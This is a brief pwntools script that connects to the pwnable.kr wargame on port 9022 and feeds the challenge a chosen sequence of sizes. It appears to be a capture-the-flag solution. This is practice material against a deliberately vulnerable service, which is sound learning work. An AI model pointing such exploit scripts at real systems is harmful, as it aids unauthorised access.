from pwn import *

r = remote("pwnable.kr", 9022)
size = 8
#open message
print(r.recvuntil(":D").decode())

for _ in range(10):
    print(r.recvuntil(": ").decode())
    r.sendline(str(size))
    size += size

for _ in range(7):
    print(r.recvuntil(": ").decode())
    r.sendline(str(size + 8))
    size += size

print(r.recvall().decode())
r.close()